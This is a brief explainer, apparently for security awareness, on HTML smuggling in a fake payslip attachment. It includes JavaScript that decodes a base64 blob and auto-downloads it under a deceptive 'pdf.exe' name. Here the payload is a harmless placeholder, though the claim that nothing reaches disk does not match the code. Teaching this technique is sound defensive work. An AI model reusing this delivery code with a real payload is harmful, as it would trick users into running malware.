This attachment renders in the browser instead of opening a document viewer. For a payslip, that alone is unusual.

In a real campaign the page carries a base64 blob and decodes it at runtime, then hands the result to a download. No payload ever crosses the network, which is why the technique is called smuggling.

const b64 = "U2VrYW50IGRlbW86IHRoaXMgaXMgYSBiZW5pZ24gcGxhY2Vob2xkZXI=";
const blob = new Blob([atob(b64)], { type: "application/octet-stream" });
const link = document.createElement("a");
link.href = URL.createObjectURL(blob);
link.download = "Payroll_Statement_2026-08.pdf.exe";
link.click();

In this demo the decoded content is a single harmless line of text. Nothing is written to disk.
